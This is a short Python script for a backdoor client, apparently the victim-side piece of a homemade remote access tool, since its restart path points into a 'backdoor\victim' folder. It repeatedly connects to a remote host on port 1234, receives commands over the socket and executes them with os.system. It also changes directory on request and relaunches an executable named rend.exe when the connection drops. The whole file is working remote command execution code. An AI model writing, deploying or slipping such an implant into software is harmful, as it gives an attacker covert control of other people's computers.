import socket
import os
connected = False
reconnected = False
cmdex=""
restart="start C:\\Users\\Arduino999\\Desktop\\backdoor\\victim\\rend.exe"
msgex=""
msg1=""
s = socket.socket()
host = "DESKTOP-F4UCV0P"
from time import sleep 
port = 1234
while not connected:
    print("ceonnecting")
    try:
        s.connect((host,port))
        connected = True
    except Exception as e:
        print(e)
        pass #Do nothing, just try again
def reconnect(reconnected):
    os.system(restart)
            
         

    
      
    
    

#getting win commands

while connected == True:
    
    try:
        cmd = s.recv(1024)
        cmd = cmd.decode()
        str(cmd)
        print("CMD recived:",cmd)
    except Exception as e:
        print(e)
        try:
            s.connect((host,port))
            connected = True
        except Exception as e:
            print(e)
            reconnect(False)           
    

        
    if "cd" in cmd:
                cmdex = cmd.replace("cd ","")
                s.send(cmdex.encode())
                print(cmdex)
                try:
                    os.chdir(cmdex)
                except Exception as e:
                    pass

    try:
        os.system(cmd)
    except Exception as e:
        pass

        


    
